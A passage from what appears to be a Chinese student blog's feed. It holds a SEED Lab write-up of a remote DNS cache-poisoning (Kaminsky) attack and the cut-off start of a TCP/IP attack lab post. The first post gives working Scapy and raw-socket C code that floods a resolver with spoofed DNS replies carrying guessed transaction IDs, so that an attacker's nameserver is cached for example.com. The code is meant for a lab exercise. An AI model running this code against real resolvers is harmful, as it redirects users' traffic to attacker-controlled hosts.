src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702258258159-95188251-fc89-4597-84bf-d7055886631a.png#averageHue=%239ebe9f&clientId=u29e8a191-aa25-4&from=paste&height=371&id=u93960421&originHeight=696&originWidth=1071&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=236781&status=done&style=none&taskId=uf04af533-57ed-4877-bacd-66e8c52d131&title=&width=571.4603271484375" alt="image.png"></p><p><a name="QSM3h"></a></p><h4 id="Task-3-Spoof-DNS-Replies"><a href="#Task-3-Spoof-DNS-Replies" class="headerlink" title="Task 3: Spoof DNS Replies"></a>Task 3: Spoof DNS Replies</h4><blockquote><p>在这个任务中，我们需要在卡明斯基攻击中欺骗DNS回复。由于我们的目标是example.com，所以我们需要欺骗来自这个域名的名称服务器的回复。学生首先需要找出example.com的合法名称服务器的IP地址（应该注意的是，这个域名有多个名称服务器）</p></blockquote><p>用户端先看一下example.com：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702261954284-fc51083e-2e8b-477e-9b84-8b83ed864c01.png#averageHue=%23252120&clientId=u29e8a191-aa25-4&from=paste&height=321&id=u4eafd79d&originHeight=505&originWidth=851&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=34172&status=done&style=none&taskId=u2f97e6ae-52b4-4307-8be0-944f23b5f8d&title=&width=540.3174848549321" alt="image.png"><br />编写欺骗程序，目的是向local dns server返回<a href="http://www.example.com的response，并欺骗其ns为攻击者的。代码gen_dns_response.py如下：">www.example.com的response，并欺骗其ns为攻击者的。代码gen_dns_response.py如下：</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;www.example.com&quot;</span></span><br><span class="line">domain = <span class="string">&quot;example.com&quot;</span></span><br><span class="line">ns = <span class="string">&quot;ns.attacker32.com&quot;</span></span><br><span class="line"></span><br><span class="line">ip  = IP (dst = <span class="string">&#x27;10.9.0.53&#x27;</span>, src = <span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">udp = UDP(dport = <span class="number">33333</span>, sport = <span class="number">53</span>,  chksum=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Qdsec  = DNSQR(qname  = name)</span><br><span class="line">Anssec = DNSRR(rrname = name,  <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, rdata  = <span class="string">&#x27;1.1.1.1&#x27;</span>, ttl = <span class="number">259200</span>)</span><br><span class="line">NSsec  = DNSRR(rrname = domain, <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>, rdata  = ns, ttl = <span class="number">259200</span>)</span><br><span class="line">dns    = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>, aa=<span class="number">1</span>, rd=<span class="number">1</span>, qr=<span class="number">1</span>, qdcount = <span class="number">1</span>, qd = Qdsec,</span><br><span class="line">             ancount = <span class="number">1</span>, an = Anssec, nscount = <span class="number">1</span>, ns = NSsec)</span><br><span class="line"></span><br><span class="line">Replypkt = ip/udp/dns</span><br><span class="line">send(Replypkt)</span><br></pre></td></tr></table></figure><p>攻击端执行代码，通过wireshark抓包看到我们的response成功到达local dns server：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702262200762-23991926-0d1f-4b9b-86e1-a2356cb8249c.png#averageHue=%23e6d4b7&clientId=u29e8a191-aa25-4&from=paste&height=465&id=u16cb3f9b&originHeight=860&originWidth=1068&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=206726&status=done&style=none&taskId=u5dce8e4a-57d5-4932-b2f2-79819887bc4&title=&width=577.4603271484375" alt="image.png"></p><p><a name="xsYpj"></a></p><h4 id="Task-4-Launch-the-Kaminsky-Attack"><a href="#Task-4-Launch-the-Kaminsky-Attack" class="headerlink" title="Task 4: Launch the Kaminsky Attack"></a>Task 4: Launch the Kaminsky Attack</h4><blockquote><p>现在我们可以把一切都集中起来，发动卡明斯基的袭击了。在攻击中，我们需要发送许多被欺骗的DNS回复，希望其中一个能到达正确的交易号码，并比合法的回复更早到达。因此，速度至关重要：我们能发送的数据包越多，成功率就越高。如果我们使用Scapy发送欺骗的DNS回复，就像我们在上的任务中所做的那样，成功率就太低了。学生可以使用C，但是在C中构建DNS包并非简单。我们介绍了一种同时使用Scapy和C的混合方法（详细信息见SEED书）。</p><p>通过混合方法，我们首先使用Scapy生成一个DNS数据包模板，它存储在一个文件中。然后，我们将这个模板加载到一个C程序中，并对一些字段进行小的更改，然后发送数据包。我们在Labsetup&#x2F;文件&#x2F;asisy.c中包含了一个骨架C代码。学生可以在已标记的区域上进行更改。对该代码的详细说明见指南部分。</p></blockquote><p>gen_dns_request.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">srcIP = <span class="string">&#x27;10.9.0.1&#x27;</span>  </span><br><span class="line">dstIP = <span class="string">&#x27;10.9.0.53&#x27;</span>  <span class="comment"># Local DNS Server</span></span><br><span class="line"></span><br><span class="line">ip  = IP (dst=dstIP, src=srcIP)</span><br><span class="line">udp = UDP(dport=<span class="number">53</span>, sport=<span class="number">50945</span>, chksum=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The C code will modify the qname field</span></span><br><span class="line">Qdsec = DNSQR(qname=<span class="string">&#x27;aaaaa.example.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dns   = DNS(<span class="built_in">id</span>=<span class="number">0xAAAA</span>, qr=<span class="number">0</span>, qdcount=<span class="number">1</span>, qd=Qdsec)</span><br><span class="line"></span><br><span class="line">pkt = ip/udp/dns</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_req.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(pkt))</span><br></pre></td></tr></table></figure><p>gen_dns_response.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip  = IP (dst = <span class="string">&#x27;10.9.0.53&#x27;</span>, src = <span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">udp = UDP(dport = <span class="number">33333</span>, sport = <span class="number">53</span>,  chksum=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the Question section</span></span><br><span class="line"><span class="comment"># The C code will modify the qname field</span></span><br><span class="line">Qdsec  = DNSQR(qname  = <span class="string">&quot;aaaaa.example.com&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the Answer section (the answer can be anything)</span></span><br><span class="line"><span class="comment"># The C code will modify the rrname field</span></span><br><span class="line">Anssec = DNSRR(rrname = <span class="string">&quot;aaaaa.example.com&quot;</span>, <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">               rdata  = <span class="string">&#x27;1.2.3.4&#x27;</span>, ttl = <span class="number">259200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the Authority section (the main goal of the attack) </span></span><br><span class="line">NSsec  = DNSRR(rrname = <span class="string">&quot;example.com&quot;</span>, <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>, </span><br><span class="line">               rdata  = <span class="string">&quot;ns.attacker32.com&quot;</span>, ttl = <span class="number">259200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the DNS part </span></span><br><span class="line">dns    = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>, aa=<span class="number">1</span>, rd=<span class="number">1</span>, qr=<span class="number">1</span>, qdcount = <span class="number">1</span>, qd = Qdsec,</span><br><span class="line">             ancount = <span class="number">1</span>, an = Anssec, nscount = <span class="number">1</span>, ns = NSsec)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the IP packet and save it to a file.</span></span><br><span class="line">Replypkt = ip/udp/dns</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_resp.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(Replypkt))</span><br></pre></td></tr></table></figure><p>编写代码attack.c:<br />1. 读取包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FILE_SIZE 2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_IP <span class="string">&quot;10.9.0.53&quot;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">send_packet_raw</span> <span class="params">(<span class="type">int</span> sock, <span class="type">char</span> *ip, <span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">char</span>* <span class="title function_">GenerateRand</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Create raw socket</span></span><br><span class="line">    <span class="type">int</span> enable=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//####read Query.bin to ip1[] Start #########</span></span><br><span class="line">    FILE *f1 = fopen(<span class="string">&quot;ip_req.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f1) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_req.bin&#x27;&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ip1[MAX_FILE_SIZE];</span><br><span class="line">    <span class="type">int</span> n1 = fread(ip1, <span class="number">1</span>, MAX_FILE_SIZE, f1);</span><br><span class="line">    <span class="comment">//####read Query.bin End #########</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//####read Reply.bin to ip2[]  Start #########</span></span><br><span class="line">    FILE *f2 = fopen(<span class="string">&quot;ip_resp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f2) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_resp.bin&#x27;&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ip2[MAX_FILE_SIZE];</span><br><span class="line">    <span class="type">int</span> n2 = fread(ip2, <span class="number">1</span>, MAX_FILE_SIZE, f2);</span><br><span class="line">    <span class="comment">//####read Reply.bin End#########</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.随机化 example.com 的子域名，发送请求包的同时，构造大量 id 响应包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">srand((<span class="type">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> temp=<span class="number">0</span>;temp&lt;<span class="number">200</span>;temp++) <span class="comment">//重复200次</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// #######send query Begin ############</span></span><br><span class="line">        <span class="type">char</span>*name=GenerateRand();</span><br><span class="line">        <span class="comment">// Modify the name in the question field (offset=41)</span></span><br><span class="line">        <span class="built_in">memcpy</span>(ip1+<span class="number">41</span>,name, <span class="number">5</span>); </span><br><span class="line">        send_packet_raw(sock, ip1, n1);</span><br><span class="line">        <span class="comment">// #######send query End ############</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//  #######send Mult reply Begin #########</span></span><br><span class="line">        <span class="comment">//  Modify the name in the question field (offset=41)</span></span><br><span class="line">        <span class="built_in">memcpy</span>(ip2+<span class="number">41</span>, name , <span class="number">5</span>); </span><br><span class="line">        <span class="comment">// Modify the name in the answer field (offset=64)</span></span><br><span class="line">        <span class="built_in">memcpy</span>(ip2+<span class="number">64</span>,name, <span class="number">5</span>);</span><br><span class="line">        <span class="comment">// Modify the IP addr in the src IP field (offset=14) 199.43.133.53-&gt;199.43.135.53</span></span><br><span class="line">        <span class="type">char</span> c=<span class="string">&#x27;\x87&#x27;</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(ip2+<span class="number">14</span>,&amp;c, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> id=<span class="number">1</span>; id&lt;<span class="number">400</span>; id++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Modify the transaction ID field (offset=28)</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> id_net_order;</span><br><span class="line">            id_net_order = htons(id);</span><br><span class="line">            <span class="built_in">memcpy</span>(ip2+<span class="number">28</span>, &amp;id_net_order, <span class="number">2</span>); </span><br><span class="line">            <span class="comment">// Send the IP packet out</span></span><br><span class="line">            send_packet_raw(sock, ip2, n2);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// Modify the IP addr in the src IP field (offset=14) 199.43.135.53-&gt;199.43.133.53</span></span><br></pre></td></tr></table></figure><p> 伪装权威域名第二个 nameserver：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">char</span> c2=<span class="string">&#x27;\x85&#x27;</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(ip2+<span class="number">14</span>,&amp;c2, <span class="number">1</span>); </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> id=<span class="number">1</span>; id&lt;<span class="number">400</span>; id++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Modify the transaction ID field (offset=28)</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> id_net_order;</span><br><span class="line">            id_net_order = htons(id);</span><br><span class="line">            <span class="built_in">memcpy</span>(ip2+<span class="number">28</span>, &amp;id_net_order, <span class="number">2</span>); </span><br><span class="line">            <span class="comment">// Send the IP packet out</span></span><br><span class="line">            send_packet_raw(sock, ip2, n2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// #######send Mult Reply End#########</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">free</span>(name);</span><br><span class="line">        name=<span class="literal">NULL</span>; <span class="comment">// A good habit for security</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;######\thave tried %d\t times, Start Next######### \n&quot;</span>,temp);</span><br><span class="line">        usleep(<span class="number">1000</span>); <span class="comment">//1000ms delay</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>函数：随机化函数与原始套接字发送<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">GenerateRand</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> a[<span class="number">26</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="comment">// Generate a random name of length 5</span></span><br><span class="line">  <span class="type">char</span>*name=<span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">5</span>; k++)</span><br><span class="line">    name[k] = a[rand() % <span class="number">26</span>];</span><br><span class="line">  <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">send_packet_raw</span><span class="params">(<span class="type">int</span> sock, <span class="type">char</span> *ip, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">  dest_info.sin_family = AF_INET;</span><br><span class="line">  dest_info.sin_addr.s_addr = inet_addr(TARGET_IP);</span><br><span class="line">  <span class="type">int</span> r = sendto(sock, ip, n, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>理想情况：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702466666668-d1862b17-1239-4200-a30a-ff1da18d5741.png#averageHue=%2334352f&clientId=uf710c0e2-da37-4&from=paste&height=165&id=uf06f30e5&originHeight=262&originWidth=1673&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=459778&status=done&style=none&taskId=u45b6df7c-5391-4f60-b81f-10c304eb9d6&title=&width=1051" alt="image.png"></li></ol><p>但我多次查看缓存，发现攻击仍是失败的(原因不明)<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702297985756-1a952975-e396-4965-a323-235f08c54704.png#averageHue=%23272523&clientId=uec22433f-29ce-4&from=paste&height=51&id=ud788944c&originHeight=72&originWidth=731&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=7801&status=done&style=none&taskId=u9722ac5b-8b2f-425b-81d0-14caa5c0138&title=&width=518.1270141601562" alt="image.png"></p><p><a name="l5bNK"></a></p><h4 id="Task-5-Result-Verification"><a href="#Task-5-Result-Verification" class="headerlink" title="Task 5: Result Verification"></a>Task 5: Result Verification</h4><blockquote><p>如果攻击成功，则在本地DNS服务器的DNS缓存中，example.com的NS记录将成为ns.attacker32.com。当此服务器接收到针对example.com域内任何主机名的DNS查询时，它将向ns.attacker32.com发送一个查询，而不是发送到该域的合法名称服务器。</p></blockquote><ol><li>向 local dns server(已经被缓存)发起查询，在 dig 之前启动 wireshark 抓包：</li><li>直接向 attacker 的 dns server 发起 dig 查询：</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702468724078-8d940b9e-cb0d-4174-a129-0dc8759d0a8a.png#averageHue=%23252221&clientId=uf710c0e2-da37-4&from=paste&height=348&id=uacd7a4c0&originHeight=548&originWidth=759&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=41993&status=done&style=none&taskId=u7ec1838c-0f8f-4815-a35e-91cd2ac5b3e&title=&width=481.90478378953406" alt="image.png"></p><ol start="3"><li>即都是在 ns.attacker32.com 里设置的 example.com zone 规则，<a href="http://www.example.com/">www.example.com</a> 为 1.2.3.5.</li><li>抓包观察 dig <a href="http://www.example.com/">www.example.com</a> 的抓包 以下为第一次 dig(1.)的抓包结果，可以看到 10.9.0.5 向 10.9.0.53 即 local dns server 发起查询，local dns server 继而向 10.9.0.153 发起查询，而 10.9.0.153 为 ns.attacker32.com 的 ip，最后该 dns server 返回 <a href="http://www.example.com/">www.example.com</a> 的 A 记录结果。 因此我们可以判断攻击是成功的。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702469713014-5d05c3dd-5126-4cfd-893b-5b72f7650367.png#averageHue=%23f0e2c7&clientId=uf710c0e2-da37-4&from=paste&height=234&id=uadf1fc02&originHeight=460&originWidth=1074&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=135666&status=done&style=none&taskId=u3b467645-33d7-46bf-a016-3aebf945e5d&title=&width=547.4444580078125" alt="image.png"><br />验证一下第二次 dig @ns.attacker32.com <a href="http://www.example.com/">www.example.com</a> 的抓包：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702469657964-709e2145-9ad1-4034-881f-ec572c1a980d.png#averageHue=%23f2e5c9&clientId=uf710c0e2-da37-4&from=paste&height=224&id=u4ea5df60&originHeight=431&originWidth=1070&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=122395&status=done&style=none&taskId=ub207043d-5b55-4bfc-bb83-3313f905bdf&title=&width=556.4404907226562" alt="image.png"><br />二者路径一致。<br><a name="kp0MH"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实验顺利完成，即本地 LAN 与远程 dns 攻击两部分都完成。对 dns 欺骗有了更深刻的认知，对缓存投毒手段在实践中了解的更透彻。同一 LAN 中，可以通过抓包看见dns 包进而实施欺骗，而远程没有这个优势，在 id 匹配方面是不小的挑战，实验通过Kaminsky 方法完成了远程 dns 攻击。在实际情况下，除了 id 的随机化，还有 dns server 源端口变化与 DNSSEC 机制应对的挑战留待解决。</p>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab DNS欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEEDLAB：TCP/IP Attack实验</title>
      <link href="/post/d8a78989.html"/>
      <url>/post/d8a78989.html</url>
      
        <content type="html"><![CDATA[<p><a name="cIZ0i"></a></p><h1 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、    实验目的"></a>一、    实验目的</h1><p><a name="Juc2u"></a></p><h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1 overview"></a>1 overview</h2><p>TCP&#x2F;IP协议中的漏洞代表了协议设计和实现中的一种特殊类型的漏洞；它们提供了一个宝贵的教训，说明了为什么安全性应该从一开始就设计好，而不是事后才加上。此外，研究这些漏洞有助于学生了解网络安全的挑战以及为什么需要许多网络安全措施。在本实验中，学生将对TCP进行几个攻击。本实验涵盖以下主题：</p><ul><li>TCP协议</li><li>TCP SYN洪水攻击和SYN cookie</li><li>TCP重置攻击</li><li>TCP会话劫持攻击</li><li>反向Shell</li></ul><p><a name="vg0k9"></a></p><h1 id="二、-实验步骤及结果"><a href="#二、-实验步骤及结果" class="headerlink" title="二、    实验步骤及结果"></a>二、    实验步骤及结果</h1><p><a name="STc8I"></a></p><h2 id="2-Environment-Setup-using-Container"><a href="#2-Environment-Setup-using-Container" class="headerlink" title="2 Environment Setup using Container"></a><strong>2 Environment Setup using Container</strong></h2><blockquote><p>在这个实验室里，我们至少需要有三台机器。我们使用容器来设置实验室环境。图1描述了实验室的设置。我们将使用攻击者容器来发起攻击，同时使用其他三个容器作为受害者和用户机器。我们假设所有这些机器都在同一个局域网上。学生们也可以在这个实验室中使用三台虚拟机，但使用容器会更方便。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701075142665-e5fda319-5d16-4b94-a675-f60d4c038a57.png#averageHue=%23f1f1f0&clientId=u14c8f42f-3f6e-4&from=paste&height=217&id=u11e59923&originHeight=562&originWidth=1486&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=150582&status=done&style=none&taskId=ud56bbf1d-7404-4851-a24c-6e34b38ca45&title=&width=574.452392578125" alt="image.png"></p><p><a name="U5nKd"></a></p><h3 id="2-1-Container-Setup-and-Commands"><a href="#2-1-Container-Setup-and-Commands" class="headerlink" title="2.1 Container Setup and Commands"></a><strong>2.1 Container Setup and Commands</strong></h3><p>在labsetup文件夹下，启动docker（内容与以往的实验相同）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ dcbuild   <span class="comment"># 构建容器映像</span></span><br><span class="line">$ dcup      <span class="comment"># 启动容器</span></span><br><span class="line">$ dcdown    <span class="comment"># 关闭容器(这个命令现在不用)</span></span><br></pre></td></tr></table></figure><p>要在容器上运行命令的话，我们通常需要在该容器上获取一个shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dockps      <span class="comment"># Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="line">$ docksh &lt;<span class="built_in">id</span>&gt; <span class="comment"># Alias for: docker exec -it &lt;id&gt; /bin/bash</span></span><br></pre></td></tr></table></figure><p>我在这里先连接上docker<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699866265114-f7a637d4-f999-4b9e-acfe-00d87d191aa9.png#averageHue=%23110f0d&clientId=u57db4859-e4a5-4&from=paste&height=166&id=ud2e6cdce&originHeight=262&originWidth=1055&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=69427&status=done&style=none&taskId=ud5c58271-3b6d-4a27-a0d7-d3ef1f75704&title=&width=669.8413002608148" alt="image.png"><br><a name="Habcl"></a></p><h3 id="2-2-About-the-Attacker-Container"><a href="#2-2-About-the-Attacker-Container" class="headerlink" title="2.2 About the Attacker 